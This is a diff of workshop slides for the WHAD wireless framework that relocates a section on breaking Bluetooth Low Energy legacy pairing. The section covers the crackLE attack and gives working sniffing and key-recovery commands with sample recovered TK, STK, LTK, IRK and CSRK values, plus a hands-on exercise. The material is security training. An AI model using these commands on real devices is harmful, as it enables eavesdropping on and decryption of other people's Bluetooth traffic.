@@ -261,102 +261,6 @@ Use <code>wup</code> / <code>whadup</code> to discover the capabilities and avai
 <img src="img/nrf52.png" style="transform:scale(0.6);" />
 </div>
 
-
----
-
-## Breaking BLE legacy pairing
-
----
-
-# BLE pairing vs bonding
-
-- Bluetooth Low Energy **pairing** allows to negotiate security keys (e.g., encryption) to encrypt and authenticate the link
-
-- Bluetooth Low Energy **bonding** is a variant of BLE pairing where the devices will store the distributed keys for later use
-
----
-
-# BLE pairing overview
-
-<img src="img/pairing.png" width="65%" style="margin-top:50px;" />
-
-
----
-
-# Legacy pairing - passkey entry
-
-<img src="img/legacy_pairing.png" width="60%" style="margin-top:60px;" />
-
-
----
-
-# CrackLE
-
-- Legacy Pairing is known to be vulnerable to a key recovery attack: **crackLE**, that allows an attacker to guess or very quickly brute force the TK (Temporary Key). 
-- With the TK and other data collected from the pairing process, the STK (Short Term Key) and later the LTK (Long Term Key) can be collected.
-- With the STK and LTK, all communications between the Central and the Peripheral can be decrypted.
-
----
-
-# CrackLE attack with WHAD
-
-
-<img src="img/crackle.png" />
-<ul>
-<li> Sniffing the pairing process and the encrypted traffic:
-</li>
-
-```
-$ wsniff -i uart0 ble -f | wdump pairing.pcap
-```
-<li> Recovering the Short Term Key (STK):
-</li>
-
-```
-$ wplay pairing.pcap | wanalyze legacy_pairing_cracking
-[✓] legacy_pairing_cracking → completed
-  - tk:  00000000000000000000000000000000
-  - stk:  11223344112233441122334411223344
-```
-
----
-
-# CrackLE attack with WHAD
-
-
-<ul>
-
-<li> Recovering the distributed keys (LTK, IRK, CSRK):
-</li>
-
-```
-$ wplay --flush pairing.pcap -d -k 11223344112233441122334411223344 | wanalyze
-[...]
-[✓] ltk_distribution → completed
-  - ltk:  2867a99de17e3548cc17cf16ef96050e
-  - rand:  38a7dcd10a1a93c6
-  - ediv:  29507
-
-[✓] irk_distribution → completed
-  - address:  74:da:ea:91:47:e3
-  - irk:  13c3a68f113b764cc8e73f55fc52c002
-
-[✓] csrk_distribution → completed
-  - csrk:  c3062f93c91eef96354edcd70a1a0306
-[...]
-```
-
----
-
-# wanalyze
-
-<img src="img/handson.png" style="height:80%; position:absolute;top:100px; left:50px;" />
-<div style="width:80%;position:absolute; top:100px; left:200px;">
-Use <code>wplay</code> and <code>wanalyze</code> to recover the Long Term Keys distributed in the following PCAP:   
-<br /><br />
-<a style="font-size:0.5em" href="https://github.com/whad-team/whad-client/raw/refs/heads/main/whad/resources/pcaps/ble_pairing.pcap"> https://github.com/whad-team/whad-client/raw/refs/heads/main/whad/resources/pcaps/ble_pairing.pcap</a>
-</div>
-
 ---
 
 <!-- _class: lead -->
@@ -701,6 +605,101 @@ $ wble-central -i hci0 -f ./example.whad
 2. Modify the previous script to load this JSON file using the interactive shell's `profile` command
 
 3. Verify that this new script runs much faster
+
+---
+
+## Breaking BLE legacy pairing
+
+---
+
+# BLE pairing vs bonding
+
+- Bluetooth Low Energy **pairing** allows to negotiate security keys (e.g., encryption) to encrypt and authenticate the link
+
+- Bluetooth Low Energy **bonding** is a variant of BLE pairing where the devices will store the distributed keys for later use
+
+---
+
+# BLE pairing overview
+
+<img src="img/pairing.png" width="65%" style="margin-top:50px;" />
+
+
+---
+
+# Legacy pairing - passkey entry
+
+<img src="img/legacy_pairing.png" width="60%" style="margin-top:60px;" />
+
+
+---
+
+# CrackLE
+
+- Legacy Pairing is known to be vulnerable to a key recovery attack: **crackLE**, that allows an attacker to guess or very quickly brute force the TK (Temporary Key). 
+- With the TK and other data collected from the pairing process, the STK (Short Term Key) and later the LTK (Long Term Key) can be collected.
+- With the STK and LTK, all communications between the Central and the Peripheral can be decrypted.
+
+---
+
+# CrackLE attack with WHAD
+
+
+<img src="img/crackle.png" />
+<ul>
+<li> Sniffing the pairing process and the encrypted traffic:
+</li>
+
+```
+$ wsniff -i uart0 ble -f | wdump pairing.pcap
+```
+<li> Recovering the Short Term Key (STK):
+</li>
+
+```
+$ wplay pairing.pcap | wanalyze legacy_pairing_cracking
+[✓] legacy_pairing_cracking → completed
+  - tk:  00000000000000000000000000000000
+  - stk:  11223344112233441122334411223344
+```
+
+---
+
+# CrackLE attack with WHAD
+
+
+<ul>
+
+<li> Recovering the distributed keys (LTK, IRK, CSRK):
+</li>
+
+```
+$ wplay --flush pairing.pcap -d -k 11223344112233441122334411223344 | wanalyze
+[...]
+[✓] ltk_distribution → completed
+  - ltk:  2867a99de17e3548cc17cf16ef96050e
+  - rand:  38a7dcd10a1a93c6
+  - ediv:  29507
+
+[✓] irk_distribution → completed
+  - address:  74:da:ea:91:47:e3
+  - irk:  13c3a68f113b764cc8e73f55fc52c002
+
+[✓] csrk_distribution → completed
+  - csrk:  c3062f93c91eef96354edcd70a1a0306
+[...]
+```
+
+---
+
+# wanalyze
+
+<img src="img/handson.png" style="height:80%; position:absolute;top:100px; left:50px;" />
+<div style="width:80%;position:absolute; top:100px; left:200px;">
+Use <code>wplay</code> and <code>wanalyze</code> to recover the Long Term Keys distributed in the following PCAP:   
+<br /><br />
+<a style="font-size:0.5em" href="https://github.com/whad-team/whad-client/raw/refs/heads/main/whad/resources/pcaps/ble_pairing.pcap"> https://github.com/whad-team/whad-client/raw/refs/heads/main/whad/resources/pcaps/ble_pairing.pcap</a>
+</div>
 
 ---
 
